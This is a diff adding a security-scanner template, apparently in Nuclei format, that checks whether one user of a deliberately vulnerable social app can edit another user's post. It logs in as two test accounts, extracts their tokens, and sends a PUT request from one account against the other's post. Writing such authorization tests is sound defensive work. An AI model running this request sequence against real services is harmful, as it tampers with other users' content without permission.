@@ -1,0 +1,70 @@
+id: vuln-sns-posts-update-authorization-bypass
+info:
+  name: Vuln SNS Posts Update - Authorization Bypass
+  author: claude
+  severity: high
+  description: |
+    Tests if users can update posts created by other users.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/
+  tags: vuln-sns,authorization,posts-update
+
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"user_id":"bob","password":"bob"}
+        
+      - |
+        POST /api/posts HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{bob_token}}
+        
+        {"content":"Bob's original post"}
+        
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"user_id":"alice","password":"alice"}
+        
+      - |
+        PUT /api/posts/{{post_id}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{alice_token}}
+        
+        {"content":"Alice modified Bob's post"}
+
+    extractors:
+      - type: regex
+        name: bob_token
+        regex:
+          - '"token":\s*"([^"]+)"'
+        part: body_1
+        internal: true
+
+      - type: regex
+        name: post_id
+        regex:
+          - '"id":\s*(\d+)'
+        part: body_2
+        internal: true
+
+      - type: regex
+        name: alice_token
+        regex:
+          - '"token":\s*"([^"]+)"'
+        part: body_3
+        internal: true
+
+    matchers:
+      - type: word
+        words:
+          - "Post updated successfully"
+        part: body_4
